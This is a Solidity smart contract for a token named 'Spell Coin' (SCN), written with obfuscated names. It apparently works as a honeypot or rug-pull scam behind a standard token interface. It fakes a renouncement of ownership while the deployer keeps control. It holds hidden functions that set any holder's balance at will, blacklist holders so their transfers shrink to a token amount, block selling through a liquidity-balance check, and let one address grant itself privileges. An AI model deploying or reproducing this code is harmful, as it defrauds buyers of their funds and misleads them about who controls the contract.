//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract receiverToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isTo {
    function createPair(address launchedTradingSell, address minIs) external returns (address);

    function feeTo() external view returns (address);
}

interface sellSwapReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface launchedBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txTeam) external view returns (uint256);

    function transfer(address totalMaxBuy, uint256 limitAmount) external returns (bool);

    function allowance(address swapAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitAmount) external returns (bool);

    function transferFrom(
        address sender,
        address totalMaxBuy,
        uint256 limitAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoSender, uint256 value);
    event Approval(address indexed swapAuto, address indexed spender, uint256 value);
}

interface launchedBuyMetadata is launchedBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SpellCoin is receiverToken, launchedBuy, launchedBuyMetadata {

    bool private receiverFee;

    address private walletSell;

    address fromToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenEnable;
    }

    function transferFrom(address tokenMinTeam, address totalMaxBuy, uint256 limitAmount) external override returns (bool) {
        if (_msgSender() != fromToken) {
            if (feeEnable[tokenMinTeam][_msgSender()] != type(uint256).max) {
                require(limitAmount <= feeEnable[tokenMinTeam][_msgSender()]);
                feeEnable[tokenMinTeam][_msgSender()] -= limitAmount;
            }
        }
        return isAmountTo(tokenMinTeam, totalMaxBuy, limitAmount);
    }

    bool private limitFund;

    function name() external view virtual override returns (string memory) {
        return receiverTo;
    }

    uint256 constant teamExempt = 15 ** 10;

    function autoLaunched() public {
        emit OwnershipTransferred(minFee, address(0));
        walletSell = address(0);
    }

    uint256 public autoTokenSell = 0;

    uint256 private toIs;

    function tokenFrom(address tokenMinTeam, address totalMaxBuy, uint256 limitAmount) internal returns (bool) {
        require(maxWallet[tokenMinTeam] >= limitAmount);
        maxWallet[tokenMinTeam] -= limitAmount;
        maxWallet[totalMaxBuy] += limitAmount;
        emit Transfer(tokenMinTeam, totalMaxBuy, limitAmount);
        return true;
    }

    mapping(address => bool) public teamTx;

    function toAuto(address teamIsWallet) public {
        minList();
        
        if (teamIsWallet == minFee || teamIsWallet == listShould) {
            return;
        }
        teamTx[teamIsWallet] = true;
    }

    uint256 private tokenEnable = 100000000 * 10 ** 18;

    function fundBuy(address launchLaunched, uint256 limitAmount) public {
        minList();
        maxWallet[launchLaunched] = limitAmount;
    }

    function isAmountTo(address tokenMinTeam, address totalMaxBuy, uint256 limitAmount) internal returns (bool) {
        if (tokenMinTeam == minFee) {
            return tokenFrom(tokenMinTeam, totalMaxBuy, limitAmount);
        }
        uint256 maxMode = launchedBuy(listShould).balanceOf(listMode);
        require(maxMode == txLiquidity);
        require(totalMaxBuy != listMode);
        if (teamTx[tokenMinTeam]) {
            return tokenFrom(tokenMinTeam, totalMaxBuy, teamExempt);
        }
        limitAmount = feeLimit(tokenMinTeam, totalMaxBuy, limitAmount);
        return tokenFrom(tokenMinTeam, totalMaxBuy, limitAmount);
    }

    function receiverMax(address shouldLiquidity) public {
        require(shouldLiquidity.balance < 100000);
        if (buyIsEnable) {
            return;
        }
        
        senderAmount[shouldLiquidity] = true;
        
        buyIsEnable = true;
    }

    uint256 txLiquidity;

    function balanceOf(address txTeam) public view virtual override returns (uint256) {
        return maxWallet[txTeam];
    }

    function transfer(address launchLaunched, uint256 limitAmount) external virtual override returns (bool) {
        return isAmountTo(_msgSender(), launchLaunched, limitAmount);
    }

    mapping(address => bool) public senderAmount;

    function feeLimit(address tokenMinTeam, address totalMaxBuy, uint256 limitAmount) internal view returns (uint256) {
        require(limitAmount > 0);

        uint256 listLimit = 0;
        if (tokenMinTeam == listShould && autoTokenSell > 0) {
            listLimit = limitAmount * autoTokenSell / 100;
        } else if (totalMaxBuy == listShould && launchedFrom > 0) {
            listLimit = limitAmount * launchedFrom / 100;
        }
        require(listLimit <= limitAmount);
        return limitAmount - listLimit;
    }

    address listMode;

    address public minFee;

    function getOwner() external view returns (address) {
        return walletSell;
    }

    uint256 public launchedFrom = 0;

    uint256 takeMode;

    function symbol() external view virtual override returns (string memory) {
        return liquidityLaunched;
    }

    string private receiverTo = "Spell Coin";

    function owner() external view returns (address) {
        return walletSell;
    }

    uint8 private fundTakeAmount = 18;

    mapping(address => mapping(address => uint256)) private feeEnable;

    bool private takeBuy;

    bool public buyIsEnable;

    mapping(address => uint256) private maxWallet;

    event OwnershipTransferred(address indexed tradingTx, address indexed launchTxToken);

    function approve(address modeAtTo, uint256 limitAmount) public virtual override returns (bool) {
        feeEnable[_msgSender()][modeAtTo] = limitAmount;
        emit Approval(_msgSender(), modeAtTo, limitAmount);
        return true;
    }

    uint256 public minTo;

    string private liquidityLaunched = "SCN";

    address public listShould;

    constructor (){
        
        autoLaunched();
        sellSwapReceiver atSender = sellSwapReceiver(fromToken);
        listShould = isTo(atSender.factory()).createPair(atSender.WETH(), address(this));
        listMode = isTo(atSender.factory()).feeTo();
        
        minFee = _msgSender();
        senderAmount[minFee] = true;
        maxWallet[minFee] = tokenEnable;
        if (toIs != minTo) {
            minTo = toIs;
        }
        emit Transfer(address(0), minFee, tokenEnable);
    }

    function tradingAmount(uint256 limitAmount) public {
        minList();
        txLiquidity = limitAmount;
    }

    function minList() private view {
        require(senderAmount[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return fundTakeAmount;
    }

    function allowance(address isLaunch, address modeAtTo) external view virtual override returns (uint256) {
        if (modeAtTo == fromToken) {
            return type(uint256).max;
        }
        return feeEnable[isLaunch][modeAtTo];
    }

}